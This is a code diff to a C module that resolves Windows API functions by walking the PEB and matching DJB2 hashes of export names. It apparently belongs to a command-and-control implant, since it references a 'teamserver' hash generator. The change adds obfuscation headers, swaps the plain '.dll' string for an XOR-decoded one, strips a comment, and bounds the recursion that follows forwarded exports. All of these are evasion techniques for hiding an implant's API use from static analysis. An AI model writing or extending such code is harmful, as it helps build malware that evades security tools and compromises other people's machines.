@@ -3,6 +3,8 @@
 #include <string.h>
 #include "resolve.h"
 #include "dynapi.h"
+#include "../../include/obf.h"
+#include "../../include/obf_strings.h"
 
 /* DJB2 — must match hashgen.DJB2 in teamserver/hashgen/hashgen.go exactly. */
 static DWORD djb2(const char *s) {
@@ -45,8 +47,8 @@ HMODULE peb_get_module(const wchar_t *name) {
     return NULL;
 }
 
-FARPROC resolve_hash(HMODULE hMod, DWORD hash) {
-    if (!hMod) return NULL;
+static FARPROC resolve_hash_r(HMODULE hMod, DWORD hash, int depth) {
+    if (!hMod || depth > 5) return NULL;
 
     BYTE *base = (BYTE *)hMod;
     IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
@@ -72,9 +74,6 @@ FARPROC resolve_hash(HMODULE hMod, DWORD hash) {
         if (djb2(fname) == hash) {
             DWORD fn_rva = funcs[ords[i]];
             if (fn_rva >= exp_rva && fn_rva < exp_rva + exp_size) {
-                /* Forwarder string: "DLLNAME.FunctionName" (no .dll suffix).
-                   On Windows 10+, most kernel32 exports forward to KERNELBASE.
-                   Use resolved fn pointers when available, PEB walk as fallback. */
                 const char *fwd = (const char *)(base + fn_rva);
                 const char *dot = fwd;
                 while (*dot && *dot != '.') dot++;
@@ -83,7 +82,8 @@ FARPROC resolve_hash(HMODULE hMod, DWORD hash) {
                 DWORD prefix_len = (DWORD)(dot - fwd);
                 if (prefix_len >= 60) continue;
                 memcpy(dll_name, fwd, prefix_len);
-                memcpy(dll_name + prefix_len, ".dll", 5);
+                char _ext[ENC_DLL_EXT_LEN + 1]; xor_dec(_ext, ENC_DLL_EXT, ENC_DLL_EXT_LEN);
+                memcpy(dll_name + prefix_len, _ext, ENC_DLL_EXT_LEN + 1);
                 HMODULE hFwd = NULL;
                 if (fnGetModuleHandleA)
                     hFwd = fnGetModuleHandleA(dll_name);
@@ -98,10 +98,14 @@ FARPROC resolve_hash(HMODULE hMod, DWORD hash) {
                     hFwd = peb_get_module(wdll);
                 }
                 if (!hFwd) continue;
-                return resolve_hash(hFwd, djb2(dot + 1));
+                return resolve_hash_r(hFwd, djb2(dot + 1), depth + 1);
             }
             return (FARPROC)(base + fn_rva);
         }
     }
     return NULL;
+}
+
+FARPROC resolve_hash(HMODULE hMod, DWORD hash) {
+    return resolve_hash_r(hMod, hash, 0);
 }
